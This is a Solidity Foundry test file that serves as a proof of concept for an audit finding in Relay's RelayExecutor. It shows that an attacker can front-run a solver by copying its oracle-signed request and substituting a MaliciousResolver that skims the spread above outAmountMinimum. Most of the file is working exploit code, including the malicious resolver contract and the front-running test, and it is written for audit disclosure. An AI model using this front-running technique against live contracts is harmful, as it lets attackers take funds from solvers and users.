// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {RelayHub} from "../src/RelayHub.sol";
import {RelayAllocator, BuildPayloadParams, IPayloadBuilder} from "../src/RelayAllocator.sol";
import {RelayExecutor} from "../src/RelayExecutor.sol";
import {ExecuteAndWithdrawRequest, Fee, ICallResolver} from "../src/call-resolvers/ICallResolver.sol";

/// @notice Minimal payload builder: the allocator only needs a non-empty payload.
contract MockPayloadBuilder is IPayloadBuilder {
    function buildPayload(string calldata, bytes calldata, BuildPayloadParams calldata)
        external
        pure
        returns (bytes memory)
    {
        return hex"01";
    }

    function hashesToSign(string calldata, bytes calldata, bytes calldata)
        external
        pure
        returns (bytes32[] memory)
    {
        return new bytes32[](0);
    }

    function curve() external pure returns (string memory) {
        return "secp256k1";
    }

    function family() external pure returns (string memory) {
        return "mock";
    }
}

/// @notice Mock 1:1 DEX on the Hub. `swap` pulls tokenIn from the caller and
///         mints the same amount of tokenOut to the caller. Requires
///         OPERATOR_ROLE on the Hub (granted in setUp) for the mint.
contract MockHubSwap {
    RelayHub internal immutable HUB;

    constructor(RelayHub hub) {
        HUB = hub;
    }

    function swap(uint256 tokenInId, uint256 tokenOutId, uint256 sourceAmount, uint256 outputAmount)
        external
    {
        require(HUB.transferFrom(msg.sender, address(this), tokenInId, sourceAmount));
        HUB.mint(msg.sender, tokenOutId, outputAmount);
    }
}

/// @notice The solver's honest resolver: swaps the ENTIRE funded input 1:1 and
///         returns ALL output to the executor. This is the flow the solver
///         intended when it got the oracle to sign the request.
contract HonestResolver is ICallResolver {
    RelayHub internal immutable HUB;
    MockHubSwap internal immutable SWAPPER;

    constructor(RelayHub hub, MockHubSwap swapper) {
        HUB = hub;
        SWAPPER = swapper;
    }

    function execute(ExecuteAndWithdrawRequest calldata request, bool, bytes calldata) external {
        uint256 tokenInId = uint256(keccak256(abi.encodePacked(request.inChainId, request.inCurrency)));
        uint256 tokenOutId =
            uint256(keccak256(abi.encodePacked(request.outChainId, request.outCurrency)));
        uint256 input = HUB.balanceOf(address(this), tokenInId);
        SWAPPER.swap(tokenInId, tokenOutId, input, input);
        uint256 output = HUB.balanceOf(address(this), tokenOutId);
        require(HUB.transfer(msg.sender, tokenOutId, output));
    }
}

/// @notice The attacker's resolver. It swaps ONLY `outAmountMinimum` of the
///         funded input (1:1 via the mock DEX), returns exactly that minimum to
///         the executor — satisfying `_finalizeWithdraw` — and sends the entire
///         remaining input balance to the attacker. No privileged role is used:
///         it only moves funds the executor itself pushed into it.
contract MaliciousResolver is ICallResolver {
    RelayHub internal immutable HUB;
    MockHubSwap internal immutable SWAPPER;
    address internal immutable BENEFICIARY;

    constructor(RelayHub hub, MockHubSwap swapper, address beneficiary) {
        HUB = hub;
        SWAPPER = swapper;
        BENEFICIARY = beneficiary;
    }

    function execute(ExecuteAndWithdrawRequest calldata request, bool, bytes calldata) external {
        uint256 tokenInId = uint256(keccak256(abi.encodePacked(request.inChainId, request.inCurrency)));
        uint256 tokenOutId =
            uint256(keccak256(abi.encodePacked(request.outChainId, request.outCurrency)));
        uint256 input = HUB.balanceOf(address(this), tokenInId);
        uint256 minimum = request.outAmountMinimum;
        require(input >= minimum, "malicious: input below minimum");
        SWAPPER.swap(tokenInId, tokenOutId, minimum, minimum);
        require(HUB.transfer(msg.sender, tokenOutId, minimum));
        uint256 kept = HUB.balanceOf(address(this), tokenInId);
        require(HUB.transfer(BENEFICIARY, tokenInId, kept));
    }
}

/// @title PoC — RelayExecutor.execute() front-running via unbound callResolver
/// @notice Demonstrates Finding 1 from audit-relay.md end to end on a local
///         deployment of the real (unmodified) Relay contracts:
///         1. A solver obtains an oracle-signed ExecuteAndWithdrawRequest.
///         2. An attacker who merely OBSERVES the solver's pending execute()
///            call copies (request, oracle, signature) verbatim, substitutes
///            its own resolver, and submits first from an unrelated EOA.
///         3. The attacker's tx succeeds, the solver's margin above
///            outAmountMinimum is extracted, and the solver's own tx then
///            reverts (request already used).
///         Numbers: order balance 1000 tokenIn, outAmountMinimum 950,
///         honest output 1000 -> attacker extracts 50 (5% of the order).
contract RelayExecutorFrontRunTest is Test {
    string internal constant IN_CHAIN_ID = "ethereum-mainnet";
    string internal constant OUT_CHAIN_ID = "ethereum-mainnet";
    string internal constant SPENDER_CHAIN_ID = "relay";

    uint256 internal constant ORDER_BALANCE = 1000;
    uint256 internal constant OUT_MINIMUM = 950;
    uint256 internal constant EXPECTED_SPREAD = 50; // ORDER_BALANCE - OUT_MINIMUM

    bytes32 internal constant REQUEST_TYPEHASH = keccak256(
        "ExecuteAndWithdrawRequest(string inChainId,bytes inCurrency,string outChainId,bytes outCurrency,uint256 outAmountMinimum,bytes depository,address orderAddress,bytes receiver,bytes data,Fee[] fees,bytes32 nonce,uint256 deadline)Fee(address recipient,uint256 amount)"
    );
    bytes32 internal constant FEE_TYPEHASH = keccak256("Fee(address recipient,uint256 amount)");
    bytes32 internal constant DOMAIN_TYPEHASH =
        keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");

    RelayHub internal hub;
    RelayAllocator internal allocator;
    RelayExecutor internal executor;
    MockHubSwap internal swapper;
    HonestResolver internal honestResolver;
    MaliciousResolver internal maliciousResolver;

    address internal owner;
    address internal solver;
    address internal attacker;
    address internal orderAddress;
    address internal depository;
    address internal receiver;
    address internal oracleSigner;
    uint256 internal oracleSignerPk;

    bytes internal inCurrency;
    bytes internal outCurrency;
    uint256 internal tokenInId;
    uint256 internal tokenOutId;
    address internal spenderAlias;

    function setUp() public {
        owner = makeAddr("owner");
        solver = makeAddr("solver");
        attacker = makeAddr("attacker");
        orderAddress = makeAddr("orderAddress");
        depository = makeAddr("depository");
        receiver = makeAddr("receiver");
        (oracleSigner, oracleSignerPk) = makeAddrAndKey("oracleSigner");

        inCurrency = abi.encodePacked(address(0));
        outCurrency = abi.encodePacked(address(1));
        tokenInId = uint256(keccak256(abi.encodePacked(IN_CHAIN_ID, inCurrency)));
        tokenOutId = uint256(keccak256(abi.encodePacked(OUT_CHAIN_ID, outCurrency)));

        hub = new RelayHub(owner);
        allocator = new RelayAllocator(owner, address(hub), address(0xbeef));
        executor = new RelayExecutor(owner, address(hub), address(allocator));
        swapper = new MockHubSwap(hub);
        honestResolver = new HonestResolver(hub, swapper);
        maliciousResolver = new MaliciousResolver(hub, swapper, attacker);

        vm.startPrank(owner);
        allocator.setPayloadBuilder(OUT_CHAIN_ID, abi.encodePacked(depository), address(new MockPayloadBuilder()));
        hub.grantRole(hub.OPERATOR_ROLE(), owner); // owner mints order funds in tests
        hub.grantRole(hub.OPERATOR_ROLE(), address(executor));
        hub.grantRole(hub.OPERATOR_ROLE(), address(allocator));
        hub.grantRole(hub.OPERATOR_ROLE(), address(swapper));
        executor.grantRole(executor.ORACLE_ROLE(), oracleSigner);
        vm.stopPrank();

        spenderAlias =
            address(uint160(uint256(keccak256(abi.encodePacked(SPENDER_CHAIN_ID, abi.encodePacked(address(executor)))))));
    }

    /// @notice THE FRONT-RUN. Attacker copies the solver's pending
    ///         (request, oracle, signature), resubmits with its own resolver.
    function test_frontRunnerStealsSolverSpread() public {
        vm.prank(owner);
        hub.mint(orderAddress, tokenInId, ORDER_BALANCE);

        ExecuteAndWithdrawRequest memory request = _request(orderAddress, OUT_MINIMUM, bytes32(uint256(1)));
        bytes memory signature = _sign(oracleSignerPk, request);
        bytes32 digest = executor.hashExecuteAndWithdrawRequest(request);

        // --- Attacker's tx lands FIRST (higher gas / earlier in the block) ---
        vm.prank(attacker);
        bytes32 withdrawHash = executor.execute(
            request, address(maliciousResolver), "", oracleSigner, signature
        );

        // (a) Attacker extracted exactly the spread above the signed minimum.
        assertEq(hub.balanceOf(attacker, tokenInId), EXPECTED_SPREAD, "attacker spread");
        // The submitted withdrawal is the SIGNED one (amount == minimum):
        // the hash commits to the full WithdrawRequest, so it proves the
        // allocator recorded a 950-unit withdrawal to the signed receiver.
        // (The alias balance itself is 0 afterwards: submitWithdrawRequest
        // burns the funded amount from the spender alias — same as upstream.)
        assertEq(hub.balanceOf(spenderAlias, tokenOutId), 0, "alias burned on submit");
        // The submitted withdrawal is still the SIGNED one: same receiver, same
        // nonce, same depository — the attacker cannot redirect the withdrawal.
        assertEq(withdrawHash, keccak256(abi.encode(_allocatorRequest(request, OUT_MINIMUM))));
        assertEq(executor.orderAddressByWithdrawRequestHash(withdrawHash), orderAddress);
        assertTrue(executor.usedRequests(digest), "request consumed");
        assertEq(hub.balanceOf(orderAddress, tokenInId), 0, "order drained");
        assertEq(hub.balanceOf(address(executor), tokenOutId), 0, "executor swept");
        assertEq(hub.balanceOf(address(maliciousResolver), tokenInId), 0, "resolver emptied");
        assertEq(hub.balanceOf(address(maliciousResolver), tokenOutId), 0, "resolver holds no output");

        console.log("order balance:      ", ORDER_BALANCE);
        console.log("outAmountMinimum:   ", OUT_MINIMUM);
        console.log("honest output would:", ORDER_BALANCE);
        console.log("attacker extracted: ", hub.balanceOf(attacker, tokenInId));
        console.log("withdrawn (minimum):", OUT_MINIMUM);

        // --- Solver's own tx lands SECOND and reverts: request already used ---
        vm.prank(solver);
        vm.expectRevert(
            abi.encodeWithSelector(RelayExecutor.RequestAlreadyExecuted.selector, digest)
        );
        executor.execute(request, address(honestResolver), "", oracleSigner, signature);

        // Solver got nothing; the order funds are already gone.
        assertEq(hub.balanceOf(solver, tokenInId), 0);
        assertEq(hub.balanceOf(address(honestResolver), tokenInId), 0);
    }

    /// @notice CONTROL: without a front-run, the honest solver flow returns the
    ///         FULL output (1000) and nobody extracts a spread.
    function test_honestSolverKeepsFullOutputWithoutFrontRun() public {
        address order2 = makeAddr("orderAddress2");
        vm.prank(owner);
        hub.mint(order2, tokenInId, ORDER_BALANCE);

        ExecuteAndWithdrawRequest memory request = _request(order2, OUT_MINIMUM, bytes32(uint256(2)));
        bytes memory signature = _sign(oracleSignerPk, request);

        vm.prank(solver);
        bytes32 withdrawHash =
            executor.execute(request, address(honestResolver), "", oracleSigner, signature);

        assertEq(withdrawHash, keccak256(abi.encode(_allocatorRequest(request, ORDER_BALANCE))));
        assertEq(hub.balanceOf(spenderAlias, tokenOutId), 0, "alias burned on submit");
        assertEq(hub.balanceOf(attacker, tokenInId), 0, "no extraction");
        assertEq(hub.balanceOf(address(honestResolver), tokenInId), 0);
    }

    /// @notice The digest binds the signed fields (e.g. outAmountMinimum) but
    ///         NOT the resolver or the caller: tampering with a signed field
    ///         invalidates the signature, while swapping resolver/caller does
    ///         not (proven by test_frontRunnerStealsSolverSpread).
    function test_tamperedSignedFieldInvalidatesSignature() public {
        ExecuteAndWithdrawRequest memory request = _request(orderAddress, OUT_MINIMUM, bytes32(uint256(3)));
        bytes memory signature = _sign(oracleSignerPk, request);
        request.outAmountMinimum = OUT_MINIMUM + 1; // not what the oracle signed

        vm.prank(solver);
        vm.expectRevert(
            abi.encodeWithSelector(RelayExecutor.InvalidSignature.selector, oracleSigner)
        );
        executor.execute(request, address(honestResolver), "", oracleSigner, signature);
    }

    // ---- helpers ----

    function _request(address order, uint256 minimum, bytes32 nonce)
        internal
        view
        returns (ExecuteAndWithdrawRequest memory)
    {
        Fee[] memory fees = new Fee[](0);
        return ExecuteAndWithdrawRequest({
            inChainId: IN_CHAIN_ID,
            inCurrency: inCurrency,
            outChainId: OUT_CHAIN_ID,
            outCurrency: outCurrency,
            outAmountMinimum: minimum,
            depository: abi.encodePacked(depository),
            orderAddress: order,
            receiver: abi.encodePacked(receiver),
            data: "",
            fees: fees,
            nonce: nonce,
            deadline: block.timestamp + 1 hours
        });
    }

    function _allocatorRequest(ExecuteAndWithdrawRequest memory request, uint256 amount)
        internal
        view
        returns (RelayAllocator.WithdrawRequest memory)
    {
        return RelayAllocator.WithdrawRequest({
            chainId: request.outChainId,
            depository: request.depository,
            currency: request.outCurrency,
            amount: amount,
            spenderChainId: SPENDER_CHAIN_ID,
            spender: abi.encodePacked(address(executor)),
            receiver: request.receiver,
            data: request.data,
            nonce: request.nonce
        });
    }

    function _sign(uint256 pk, ExecuteAndWithdrawRequest memory request)
        internal
        view
        returns (bytes memory)
    {
        bytes32 structHash = keccak256(
            abi.encode(
                REQUEST_TYPEHASH,
                keccak256(bytes(request.inChainId)),
                keccak256(request.inCurrency),
                keccak256(bytes(request.outChainId)),
                keccak256(request.outCurrency),
                request.outAmountMinimum,
                keccak256(request.depository),
                request.orderAddress,
                keccak256(request.receiver),
                keccak256(request.data),
                _hashFees(request.fees),
                request.nonce,
                request.deadline
            )
        );
        bytes32 domain = keccak256(
            abi.encode(
                DOMAIN_TYPEHASH,
                keccak256(bytes("RelayExecutor")),
                keccak256(bytes("1")),
                block.chainid,
                address(executor)
            )
        );
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domain, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        return abi.encodePacked(r, s, v);
    }

    function _hashFees(Fee[] memory fees) internal pure returns (bytes32) {
        bytes32[] memory feeHashes = new bytes32[](fees.length);
        for (uint256 i; i < fees.length; ++i) {
            feeHashes[i] = keccak256(abi.encode(FEE_TYPEHASH, fees[i].recipient, fees[i].amount));
        }
        return keccak256(abi.encodePacked(feeHashes));
    }
}
